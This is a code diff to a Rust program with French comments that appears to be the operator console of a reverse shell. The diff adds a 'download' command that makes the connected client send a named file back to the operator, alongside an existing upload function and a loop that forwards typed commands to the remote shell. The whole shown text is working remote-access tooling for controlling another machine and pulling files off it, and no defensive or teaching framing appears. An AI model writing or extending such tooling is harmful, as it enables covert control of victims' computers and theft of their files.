@@ -67,6 +67,23 @@ fn handle_client(mut stream: TcpStream) {
             continue;
         }
 
+        // Gestion de la commande download
+        if trimmed_command.starts_with("download ") {
+            let args: Vec<&str> = trimmed_command.split_whitespace().collect();
+            if args.len() != 3 {
+                println!("Usage: download <remote_file> <local_file>");
+                continue;
+            }
+
+            let remote_file = args[1];
+            let local_file = args[2];
+
+            if let Err(e) = download(&mut stream, remote_file, local_file) {
+                println!("Error downloading file: {}", e);
+            }
+            continue;
+        }
+
         // Envoi de la commande au reverse shell
         if let Err(e) = stream.write(trimmed_command.as_bytes()) {
             eprintln!("Failed to send command: {}", e);
@@ -101,6 +118,27 @@ fn upload(stream: &mut TcpStream, local_file: &str, remote_file: &str) -> io::Re
     // Envoie les données du fichier
     stream.write_all(&file_data)?;
     println!("File '{}' uploaded as '{}'", local_file, remote_file);
+
+    Ok(())
+}
+
+// Fonction pour télécharger un fichier depuis le client
+fn download(stream: &mut TcpStream, remote_file: &str, local_file: &str) -> io::Result<()> {
+    // Envoie une commande de téléchargement au client
+    stream.write_all(format!("DOWNLOAD {}\n", remote_file).as_bytes())?;
+
+    // Attendre la réponse du client avec les données du fichier
+    let mut buffer = vec![0; 1024];
+    let size = stream.read(&mut buffer)?;
+
+    if size == 0 {
+        return Err(io::Error::new(io::ErrorKind::NotFound, "File not found or error during transfer"));
+    }
+
+    // Écrire les données dans un fichier local
+    let mut file = File::create(local_file)?;
+    file.write_all(&buffer[..size])?;
+    println!("File '{}' downloaded successfully", local_file);
 
     Ok(())
 }
